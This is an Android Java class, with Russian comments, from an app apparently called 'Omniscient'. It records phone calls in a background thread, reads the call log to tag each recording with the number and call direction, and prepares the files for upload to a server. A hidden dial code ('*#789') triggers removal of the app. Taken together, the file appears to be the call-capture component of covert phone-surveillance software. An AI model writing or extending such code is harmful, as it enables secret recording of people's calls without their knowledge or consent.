package com.postal.omniscient.postal.catchPhone.Call;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.provider.CallLog;
import android.util.Log;

import com.postal.omniscient.postal.adapter.EventBusCall;
import com.postal.omniscient.postal.adapter.EventBusData;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * Поток записи разговора
 * Created by Александр on 02.08.2016.
 */
public class CallInThread extends Thread {

    public CallInThread(Context context, String folderName, String fileName){
        this.context = context;
        this.folderName = folderName;
        this.fileName = fileName;

    }

    private Context context;
    private String folderName, fileName;
    private MediaRecorder recorder;
    private File audiofile;
    private String time = new SimpleDateFormat("yyyy_MM_dd_HH-mm-ss")
            .format(new Date());
    private String no_written = "no_written_";
    private File tempFile = null;

    private static final String code = "*#789";
    private static final String delete = "delete";

    @Override
    public void run() {
        recordStart();
    }
    // начинаем запись
    private void recordStart() {
        try {
            EventBus.getDefault().register(this);//для прослушивания сообщения о начале и завершении разговора

            File sampleDir = new File(context.getFilesDir(), "/Omniscient/" + folderName);

            if (!sampleDir.exists()) {
                sampleDir.mkdirs();
            }

            try {
                //временный файл записи разговора (до перейменования)
                tempFile = File.createTempFile(no_written + "_" + time, fileName, sampleDir);
                audiofile = tempFile;
            } catch (IOException e) {
                Log.i("MyMsg", "Eror T -1 " + e);
            }
            //готовим для записи рекордер
            recorder = new MediaRecorder();

            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);//VOICE_COMMUNICATION ip call
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(audiofile.getAbsolutePath());
            try {
                recorder.prepare();
                recorder.start();

            } catch (IllegalStateException e) {
                Log.i("MyMsg", "Eror T0 " + e);
            } catch (IOException e) {
                Log.i("MyMsg", "Eror T1 " + e);
            } catch (Exception e) {
                Log.i("MyMsg", "Eror Record " + e);
            try {
                audiofile.delete();
                recorder.stop();
                recorder = null;
            }catch (Exception er){Log.i("MyMsg", "Error in Record close " + er);}
            }
        }catch (Exception e){Log.i("MyMsg", "Error in Record " + e);}
    }
    //останавливаем запись разговора
    public void recordStop(){
        try {
            recorder.stop();
            recorder.release();
            recorder = null;

            renameFile();
            EventBus.getDefault().post(new EventBusData("call_off"));
            EventBus.getDefault().unregister(this);
        }catch (Exception e){Log.i("MyMsg", "Eror Record " + e);}
    }
    //переименовуем файл после окончания записи для отправки на сервер
    private void renameFile() {
        try {
            //временный файл записи разговора
            File dir = new File(context.getFilesDir(), "/Omniscient/" + folderName);
            if (dir.exists()) {

                File from = tempFile;//new File(dir,no_written+file_name+fileName);
                long sec = 1000 * 2;
                try {
                    // забаюкиваем поток что бы контент-провайдер успел записать номер телефона
                    Thread.sleep(sec);
                } catch (Exception e) {
                    Log.e("MyMsg", "1" + e.toString());
                }
                String in_out_Call = getNumber();

                //удаляем запись если позвонили на неправельный номер (который содержит * или #)
                if (in_out_Call.equals(delete)) {
                    from.delete();
                    return;
                }
                //перейменовуем файл
                File to = new File(dir, time + "_" + in_out_Call + fileName);
                if (from.exists())
                    from.renameTo(to);
            }
        }catch (Exception e){Log.i("MyMsg", "Error renameFile");}
    }
    //получаем телефонный номер
    private  String getNumber(){
        String call_number = "";
        String call_in_or_out = "";
        String in_out = "";
        try {
            String date = CallLog.Calls.DATE;// "date";
            String type = CallLog.Calls.TYPE;//"type";
            String number = CallLog.Calls.NUMBER;//"number";
            Uri uri;
            uri = CallLog.Calls.CONTENT_URI;//Uri.parse("content://call_log/calls");
            String[] projection = {type, number};

            try {
                Cursor cur = context.getContentResolver().query(uri,
                        projection, null, null, date + " DESC");// DESC - сортировка по убываню
                if (cur.moveToFirst()) {
                    call_number = cur.getString(1);//1 потомучто {type, number}; number - идет 2м элементом
                    call_in_or_out = cur.getString(0);
                }
                if (call_in_or_out.equals("2")) {
                    in_out = "_out_call";
                } else if (call_in_or_out.equals("1")) {
                    in_out = "_in_call";
                }
                //УДАЛЕНИЕ ПРИЛОЖЕНИЯ
                if (call_number.equals(code)) {
                    deleteAPP(context);
                }
                //удаляем запись если намер имеет * или # так как такие номера ошибочны
                if (call_number.contains("*") || call_number.contains("#")) {
                    return delete;
                }
                //удалем + если такой имееться в номере телефона
                if (call_number.contains("+")) {
                    call_number = call_number.replace("+", "");
                }

            } catch (Exception e) {
            }
        }catch (Exception e){Log.i("MyMsg", "Error getNumber");}
        return call_number+in_out;
    }
    //удаление приложения по коду
    private void deleteAPP(final Context context) {
        try {
            Uri packageURI = Uri.parse("package:com.postal.omniscient");
            Intent i = new Intent(Intent.ACTION_DELETE, packageURI);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
        }catch (Exception e){Log.i("MyMsg", "Error deleteAPP");}
    }
//регестрируем слушатель события начала звонка и окончания звонка
    @Subscribe(threadMode = ThreadMode.ASYNC)
    public void onEvent(EventBusCall event){
        String command = event.getComand();
        if(command.equals("stop")){
            recordStop();

        }
    }

}
